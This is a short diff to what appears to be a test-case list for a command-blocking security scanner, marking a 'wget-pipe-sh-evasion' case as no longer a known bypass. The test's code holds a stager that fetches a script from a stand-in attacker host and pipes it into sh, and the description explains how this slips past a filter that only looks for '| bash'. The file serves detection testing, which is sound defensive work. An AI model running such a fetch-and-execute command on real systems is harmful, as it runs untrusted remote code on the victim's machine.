@@ -80,7 +80,7 @@ module.exports = [
     technique: 'wget-pipe-sh-evasion',
     severity: 'CRITICAL',
     expected: 'BLOCK',
-    knownBypass: true,
+    knownBypass: false, // closed: pipe-to-shell BLOCK_REGEXES (Phase 1)
     description: 'wget ... | sh stager — dodges the "| bash" literal by piping into sh instead',
     code: `
       require('child_process').execSync('wget -qO- https://evil.example/s | sh');
